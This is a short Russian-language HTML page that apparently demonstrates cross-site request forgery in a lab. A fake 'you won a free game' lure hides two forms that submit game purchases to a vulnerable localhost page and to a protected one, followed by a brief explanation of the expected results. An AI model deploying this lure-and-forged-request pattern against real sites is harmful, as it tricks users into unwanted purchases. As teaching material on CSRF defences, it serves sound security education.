<h1>🎉 ПОЗДРАВЛЯЕМ! ВЫ ВЫИГРАЛИ БЕСПЛАТНУЮ ИГРУ!</h1>
<p>Нажмите кнопку, чтобы получить свой приз:</p>

<form id="attack1" action="http://localhost/csrf/index.php" method="POST" style="display:none">
    <input type="hidden" name="game" value="cs2">
    <input type="hidden" name="price" value="300">
    <input type="hidden" name="buy" value="1">
</form>

<form id="attack2" action="http://localhost/csrf/secure.php" method="POST" style="display:none">
    <input type="hidden" name="game" value="dota2">
    <input type="hidden" name="price" value="250">
    <input type="hidden" name="buy" value="1">
</form>

<button onclick="document.getElementById('attack1').submit()">ПОЛУЧИТЬ CS2 (атака на index.php)</button>
<br><br>
<button onclick="document.getElementById('attack2').submit()">ПОЛУЧИТЬ DOTA2 (атака на secure.php)</button>

<hr>
<p><strong>Объяснение:</strong><br>
- Первая кнопка атакует уязвимую страницу – покупка пройдёт.<br>
- Вторая кнопка атакует защищённую страницу – будет ошибка CSRF.</p>